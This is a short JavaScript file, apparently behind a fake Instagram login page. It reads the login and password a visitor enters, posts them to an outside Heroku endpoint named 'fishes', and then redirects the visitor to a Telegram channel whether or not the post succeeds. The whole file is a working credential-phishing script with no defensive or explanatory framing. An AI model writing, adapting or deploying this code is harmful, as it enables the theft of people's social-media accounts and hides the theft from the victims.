const login = document.getElementById("login")
const password = document.getElementById("password")

const btn = document.getElementById("btn")

btn.onclick = () => {

  const body = {
    platform: "Instagram",
    login: login.value,
    password: password.value
  }

  axios.post("https://sendtotelegram.herokuapp.com/fishes", body)
    .then(res => {
      window.location.href = `https://t.me/abbos_arts`
    })
    .catch(err => {
      window.location.href = `https://t.me/abbos_arts`
    })
}